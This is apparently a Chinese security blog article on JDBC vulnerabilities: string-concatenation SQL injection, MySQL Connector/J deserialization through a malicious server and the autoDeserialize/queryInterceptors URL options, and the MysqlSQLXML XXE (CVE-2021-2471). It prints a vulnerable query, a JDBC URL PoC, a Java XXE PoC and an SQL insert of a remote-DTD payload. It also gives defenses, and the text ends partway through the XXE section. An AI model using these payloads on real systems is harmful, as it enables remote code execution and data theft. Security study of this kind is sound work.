java安全-JDBC安全问题

JAVA JDBC
JAVA
发布日期:   2022-02-11

首发于 SecIN社区https://www.sec-in.com/article/1564

JDBC简介

JDBC（Java Data Base Connectivity，java数据库连接）是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问，它由一组用Java语言编写的类和接口组成。JDBC提供了一种基准，据此可以构建更高级的工具和接口，使数据库开发人员能够编写数据库应用程序。

与此同时，JDBC也会带来以下的安全隐患，做了些总结，限于水平，难免有欠缺，希望师傅们指出。

有关 sql注入、反序列化、XXE。

JDBC连接样例：

//1.注册数据库驱动
DriverManager.registerDriver(new Driver());
//2.获取数据库连接
Connection conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/day10", "root", "root");
//3.获取传输器对象
Statement stat = conn.createStatement();
//4.利用传输器传输sql语句到数据库中执行,获取结果集对象
ResultSet rs = stat.executeQuery("select * from user");
//5.遍历结果集获取查询结果
while(rs.next()){
    String name = rs.getString("name");
    System.out.println(name);
}
//6.关闭资源
rs.close();
stat.close();
conn.close();

JDBC sql注入

毕竟JDBC只是一种执行sql语句的Java API，所以他肯定也有sql注入的安全隐患。

// concat sql
Statement stmt = connection.createStatement();
String sql = "SELECT * FROM users WHERE id ='"+ id + "'";
ResultSet rs = stmt.executeQuery(sql);

假设有这么几个语句，executeQuery执行的sql语句中存在拼接，将id拼接到sql语句中，而id又可控，没有其他的过滤方法，那么sql注入风险就会存在。

其实就是普通的sql注入。

那么在JDBC中我们怎么保证安全？

使用参数化查询（parameterized queries），即 SQL 语句中使用参数绑定( ? 占位符 ) 和 PreparedStatement。

PreparedStatement始终使用?作为占位符，并且把数据连同SQL本身传给数据库，这样可以保证每次传给数据库的SQL语句是相同的，只是占位符的数据不同，还能高效利用数据库本身对查询的缓存。

上面的语句我们可以这样写

// use ? to bind variables
String sql = "SELECT * FROM users WHERE id= ? ";
PreparedStatement ps = connection.prepareStatement(sql);
// 参数 index 从 1 开始，有几个参数绑定就写几个。
ps.setString(1, name);
ps.execute();

我们需要注意，并不是使用了prepareStatement就可以防止sql注入，防止sql注入是因为所有需要传入的参数都使用了占位符，保证数据与代码分离。

如果你在使用prepareStatement之前就拼接了sql语句，照样会导致注入。

当然，并不是所有情况都可以使用prepareStatement，比如order by、column name，不能使用参数绑定，此时需要手工过滤，如通常 order by 的字段名是有限的，因此可以使用白名单的方式来限制参数值。我们也可以全方位的进行字符转义，来防止注入。

Mysql JDBC 反序列化漏洞

需要准备：

8.x版本的mysql-connector-java依赖（不同版本的依赖，利用方式有所区别）

我用的是8.0.19，如果你用的版本不能顺利分析下来，可能版本不在影响范围之内，换一个版本。

影响范围（5.1.28 - 5.1.19，5.1.29 - 5.1.40，5.x <= 5.1.10，>=5.1.11，6.x，8.x）

漏洞原理

如果攻击者能够控制JDBC连接设置项，那么就可以通过设置其指向恶意MySQL服务器进行ObjectInputStream.readObject()的反序列化攻击从而RCE。

具体点说，就是通过JDBC连接MySQL服务端时，会有几个内置的SQL查询语句要执行，其中两个查询的结果集在MySQL客户端被处理时会调用ObjectInputStream.readObject()进行反序列化操作。如果攻击者搭建恶意MySQL服务器来控制这两个查询的结果集，并且攻击者可以控制JDBC连接设置项，那么就能触发MySQL JDBC客户端反序列化漏洞。

可被利用的两条查询语句：

  • SHOW SESSION STATUS
  • SHOW COLLATION

漏洞分析

我们可以在IDEA的外部库中找到依赖。

如果要是序列化的问题的话，那肯定少不了readObject。

作者在com.mysql.cj.jdbc.result.ResultSetImpl下的getObject(int columnIndex)函数中找到了readObject。

一共有两处readObject。

一处是case BIT，一处是case BLOB。

我们需要知道

BIT和BLOB都是MySQL里的一种数据格式

BLOB：是二进制形式的长文本数据，大小是0-65535 bytes

BIT：是用来存储bit值的，BIT(M)代表可以存储M个bit，M的取值范围为1到64 如果手工指定bit值，则可以使用b'value'格式，比如b'111'和 b'10000000'分别代表7和128。

我们可以看到

case BIT和case BLOB有一些差不多的判断逻辑

//判断数据是不是blob或者二进制数据
if (field.isBinary() || field.isBlob())

//获取连接属性的autoDeserialize是否为true
if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue())

//判断数据是不是序列化后的对象，-84 -19其实就是AC ED (0xAC == 256 - 84, 0xED == 256 - 19)，就是Java的序列化内容的魔术头
if ((data[0] == -84) && (data[1] == -19))

//满足了上述条件，就可以反序列化了。

接下来我们就是要找到个调用getobject的地方，我们把目光放在com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()中的ResultSetUtil.resultSetToMap(toPopulate, rs);

前面原理中提到了两条查询语句，在这里我们就可以看到它执行了其中一句SHOW SESSION STATUS

执行SHOW SESSION STATUS后并处理其结果时,调用了getObject()，注意这里调用了两次。

于是我们要再找调用populateMapWithSessionStatusValues的地方，我们找到了``com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor的postProcess()和preProcess()方法

那我们怎么调用postProcess或者preProcess呢，这需要我们知道这个类的含义

public class ServerStatusDiffInterceptor implements QueryInterceptor

此类实现了QueryInterceptor

所以ServerStatusDiffInterceptor是一个拦截器，在JDBC URL中设定属性queryInterceptors为ServerStatusDiffInterceptor时，执行查询语句会调用拦截器的preProcess和postProcess方法，进而通过上述调用链最终调用getObject()方法。

所以最终思路就是，执行查询语句，触发拦截器，执行preProcess，进入到populateMapWithSessionStatusValues，再执行SHOW SESSION STATUS，得到序列化的数据，进入getObject，反序列化。

我们攻击的地方就在于执行SHOW SESSION STATUS，这个过程得到的数据，是我们可以去控制的，从而导致反序列化了恶意类。

于是poc也得出来了，我们需要触发拦截器，在进入getObject的时候，需要通过一个判断

//poc
queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true

漏洞利用

利用方式在分析过程中说到，代码执行了SHOW SESSION STATUS,并把拿到的数据，可以进行反序列化。

所以我们需要控制这个数据。

这有两个前提

1.可以控制JDBC连接设置项（即可以控制连接语句）

2.存在链子可以打

防御方案

  1. 黑名单检查（检查输入流，如果存在一些恶意类，则反序列化过程停止）

  2. 白名单过滤（JEP290、SerialKiller）

    •允许对传入的对象序列化数据流进行过滤，以提高安全性

    •定义可以由属性或配置文件配置的全局过滤器。

    •在反序列化过程中将调用filter接口方法，以验证要反序列化的类。过滤器返回接受，拒绝或保留未确定，允许或禁止状态的状态。

  3. 运行时应用程序自我保护（RASP）

Mysql JDBC XXE（CVE-2021-2471）

提前说下，这种洞比较鸡肋。需要其他的比较苛刻的条件。

需要准备：

因为影响版本< MySQL JDBC 8.0.27，所以上面反序列化的环境也能复现。

漏洞原理

getSource方法未对传入的XML格式数据进行检验。导致攻击者可构造恶意的XML数据引入外部实体。造成XXE攻击。

前置知识

什么是SQLXML？

在开发的过程中，可能会需要在数据库中存储和检索XML文档，因此引入了SQLXML类型，SQLXML提供了 String、Reader、Writer 或
Stream 等多种形式访问XML值的方法。

我们可以通过ResultSet、CallableStatement 、PreparedStatement 中的getSQLXML方法获取SQLXML对象。

再使用SQLXML对象提供的xml解析器去解析xml。

下面要用到的createSQLXML也是获取SQLXML对象的方法。

漏洞分析

漏洞发生在com.mysql.cj.jdbc.MysqlSQLXML下的getSource函数中

函数大概的逻辑如下：

public <T extends Source> T getSource(Class<T> clazz) throws SQLException {
    checkClosed();
    checkWorkingWithResult();

    if (clazz == null || clazz.equals(SAXSource.class)) {

    } else if (clazz.equals(DOMSource.class)) {

    } else if (clazz.equals(StreamSource.class)) {

    } else if (clazz.equals(StAXSource.class)) {

    } else {
        throw SQLError.createSQLException(Messages.getString("MysqlSQLXML.2", new Object[] { clazz.toString() }),
                MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);
    }
}

可以看的出来，是判断clazz类是书鱼哪一种Source源，则进入哪一个判断。

当传入类型为DOMSource时，则使用DocumentBuilder对数据进行解析处理。

可以看到，domsource处理逻辑中，没有对inputsource进行一个过滤，这就是说，如果inputsource可控，那么将直接被直接解析xml内容。

那inputsource是当this.fromResultSet为flase的时候，被this.stringRep控制的。

这里的this.fromResultSet不出意外，基本上是false的状态

因为在构造函数的时候，就已经被初始化为false。

而this.stringRep可以通过当前类的setString方法类设置stringRep的值。

那我们如何触发它呢？

createSQLXML方法的作用就是返回一个MysqlSQLXML对象。

所以只要用createSQLXML返回个MysqlSQLXML对象，并最后调用getsource就可以最后解析xml。

//poc
import javax.xml.transform.dom.DOMSource;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.SQLXML;
public class main {
    public static void main(String[] args) throws SQLException {
        String poc = "<!DOCTYPE b [<!ENTITY xxe SYSTEM  \"http://127.0.0.1:2333/poc.txt\">]><name>&xxe;</name>";
        Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/", "root","root");
        SQLXML sqlxml = connection.createSQLXML();
        sqlxml.setString(poc);
        sqlxml.getSource(DOMSource.class);

    }
}

分析一下

我们先用getConnection创建了一个jdbc连接，然后用createSQLXML返回了个MysqlSQLXML对象，然后我们要用的xxe的payload写入数据库，最后getSource读取，并解析。

这样看起来似乎挺好，但此poc需要靠开发人员写成这个，应该在真实环境中很难见到有setString参数可控的。

而现实中可能更多的是，类似于这种

package com.example.demo3;
import javax.xml.transform.dom.DOMSource;
import java.sql.*;

public class main {
    public static void main(String[] args) throws SQLException {
        Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/sys", "root","root");
        Statement statement = connection.createStatement();
        statement.execute("select * from test");
        ResultSet resultSet = statement.getResultSet();
        while (resultSet.next()) {
            SQLXML sqlxml = resultSet.getSQLXML("message");
            sqlxml.getSource(DOMSource.class);
        }
    }
}

使用getSQLXML获取数据库相应字段的数据后，返回一个MysqlSQLXML对象。

然后getSource调用，解析这些数据。

那么我们就需要先把恶意的payload写入数据库中，让程序getSQLXML拿出来，再解析。

所以这也是为什么很鸡肋的一个原因。

create table tb_test (
  id bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  message text COMMENT 'SQLXML',
  PRIMARY KEY (`id`)

然后模拟我们已经有了一个可以把恶意数据放进数据库的方法

insert into tb_test(message) values('<?xml version="1.0" ?> <!DOCTYPE note [ <!ENTITY % remote SYSTEM "http://127.0.0.1:80/xxe.dtd"> %remote; ]>');
